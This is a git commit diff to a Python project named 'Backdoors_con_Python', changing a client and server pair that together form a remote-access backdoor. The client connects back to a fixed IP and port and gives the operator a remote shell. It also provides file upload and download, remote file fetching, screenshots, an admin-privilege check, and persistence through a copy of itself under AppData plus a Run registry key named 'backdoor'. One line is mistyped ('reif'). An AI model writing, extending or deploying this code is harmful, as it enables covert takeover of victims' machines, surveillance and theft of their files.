abdf8f0f746055a2d6c8597df53c7667c2e87ef4
Jose Castro <drakonc@gmail.com>
2019-10-23 09:41:00 -0500

    .

--- Backdoors_con_Python/cliente.py
+++ Backdoors_con_Python/cliente.py
@@ -2,70 +2,117 @@
 #_*_ coding: utf8 _*_
 
 import socket
-import os
 import subprocess
+import json
+import os
 import base64
+import shutil
+import sys
+import time
 import requests
 import mss
-
-def captura_pantalla():
+ 
+def enviar_datos(data):
+    datasend = json.dumps(data)
+    sock.send(datasend)
+ 
+def screenshot():
     screen = mss.mss()
     screen.shot()
-
-def download_file(url):
-    consulta = requests.get(url)
-    name_file = url.split("/")[-1]
-    with open(name_file,"wb") as file_get:
-        file_get.write(consulta.content)
-
-def shell():
-    current_dir = os.getcwd()
-    cliente.send(current_dir)
+    
+def admin_check():
+    global admin
+    try:
+        check = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
+    except:
+        admin = "ERROR, privilegios insuficientes"
+    else:
+        admin = "Privilegios de administrador"
+ 
+    
+def recibir_datos():
+    data = ""
     while True:
-        res = cliente.recv(1024)
-        if res == "exit":
+        try:
+            data = data + sock.recv(1024)
+            return json.loads(data)
+        except ValueError:
+            continue
+ 
+def create_persistence():
+    location = os.environ['appdata'] + "\\windows32.exe"
+    reif not os.path.exists(location):
+        shutil.copyfile(sys.executable,location)
+        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "' + location + '"', shell=True)
+def connection():
+    while True:
+        time.sleep(2)
+        try:
+            sock.connect(('192.168.253.15',7777))
+            shell()
+        except:
+            connection()
+ 
+def download(url):
+    file_download = requests.get(url)
+    name_file = url.split("/")[-1]
+    with open(name_file,'wb') as file_out:
+        file_out.write(file_download.content)
+ 
+def shell():
+    while True:
+        s = sock.recv(2048)
+        if s == "q":
             break
-        elif res[:2] == "cd" and len(res)>2:
-            os.chdir(res[3:])
-            result = os.getcwd()
-            cliente.send(result)
-        elif res[:8] == "download":
-            with open(res[9:],"rb") as file_download:
-                cliente.send(base64.b64encode(file_download.read()))
-        elif res[:6] == "upload":
-            with open(res[7:],"wb") as file_upload:
-                datos = cliente.recv(30000)
-                file_upload.write(base64.b64decode(datos))
-        elif res[:3] == "get":
+        elif s[:2] == "cd" and len(s) > 1:
             try:
-                download_file(res[4:])
-                cliente.send("Archivo descargado Correctamente")
+                os.chdir(s[3:])
+                sock.send(str(os.getcwd()))
             except:
-                cliente.send("Ocurrio un error en la Descarga")
-        elif res[:10] == "screenshot":
+                continue
+        elif s[:8] == "download":
+            with open(s[9:],'rb') as file_download:
+                sock.send(base64.b64encode(file_download.read()))
+        elif s[:6] == "upload":
+            with open(s[7:],'wb') as file_upload:
+                datos = sock.recv(20480)
+                file_upload.write(base64.b64decode(datos))
+        elif s[:3] == "get":
             try:
-                captura_pantalla()
+                download(s[4:])
+                sock.send("Archivo descargado!")
+            except:
+                sock.send("Error al descargar el archivo")
+        elif s[:10] == "screenshot":
+            try:
+                screenshot()
                 with open("monitor-1.png",'rb') as sc:
-                    cliente.send(base64.b64encode(sc.read()))
+                    sock.send(base64.b64encode(sc.read()))
                 os.remove('monitor-1.png')
             except:
-                cliente.send(base64.b64encode("fail"))
-        elif res[:5] == "start":
+                sock.send(base64.b64encode("fail"))
+        elif s[:5] == "check":
             try:
-                subprocess.Popen(res[6:], shell=True)
-                cliente.send("Programa Iniciado")
+                admin_check()
+                sock.send(admin)
             except:
-                cliente.send("No se Puedo Iniciar el Programa")
-            pass
+                sock.send("No pude realizar la tarea")
+        elif s[:5] == 'start':
+            try:
+                subprocess.Popen(s[6:],shell=True)
+                sock.send("Programa iniciado!")
+            except:
+                sock.send("Error al iniciar el programa")
         else:
-            proc = subprocess.Popen(res,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
-            result = proc.stdout.read() + proc.stderr.read()
-            if len(result) == 0:
-                cliente.send("1")
+            result = subprocess.Popen(s, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            proc = result.stdout.read() + result.stderr.read()
+            if len(proc) == 0:
+                sock.send("1")
             else:
-                cliente.send(result)
-
-cliente = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-cliente.connect(('192.168.253.15',7777))
+                sock.send(proc)
+                
+create_persistence()
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection()
 shell()
-cliente.close()
+sock.close()
--- Backdoors_con_Python/server.py
+++ Backdoors_con_Python/server.py
@@ -2,9 +2,10 @@
 #_*_ coding: utf8 _*_
 
 import socket
-import base64
-
-
+import base64 
+ 
+ 
+ 
 def shell():
     current_dir = target.recv(1024)
     count = 0
@@ -17,23 +18,24 @@ def shell():
             target.send(comando)
             res = target.recv(1024)
             current_dir = res
+            print(res)
         elif comando == "":
             pass
         elif comando[:8] == "download":
             target.send(comando)
-            with open(comando[9:],"wb") as file_download:
+            with open(comando[9:],'wb') as file_download:
                 datos = target.recv(30000)
                 file_download.write(base64.b64decode(datos))
         elif comando[:6] == "upload":
             try:
                 target.send(comando)
-                with open(comando[7:],"rb") as file_upload:
+                with open(comando[7:],'rb') as file_upload:
                     target.send(base64.b64encode(file_upload.read()))
             except:
                 print("Ocurrio un error en la subida")
         elif comando[:10] == "screenshot":
             target.send(comando)
-            with open("imagen-%d.png" % count, 'wb') as screen:
+            with open("monitor-%d.png" % count, 'wb') as screen:
                 datos = target.recv(1000000)
                 data_decode = base64.b64decode(datos)
                 if data_decode == "fail":
@@ -47,24 +49,24 @@ def shell():
             res = target.recv(30000)
             if res == "1":
                 continue
-            else: 
+            else:
                 print(res)
-
+ 
 def upserver():
     global server
     global ip
     global target
-
-    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+ 
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server.bind(('192.168.253.15',7777))
     server.listen(1)
-
-    print("Corriendo Servidor y Esperando Conexiones.....")
-
+ 
+    print("Corriendo servidor y esperando conexiones...")
+ 
     target, ip = server.accept()
-    print("Conexion Recibida de: " + str(ip[0]))
-
+    print("Conexion recibida de: " + str(ip[0]))
+ 
 upserver()
 shell()
 server.close()
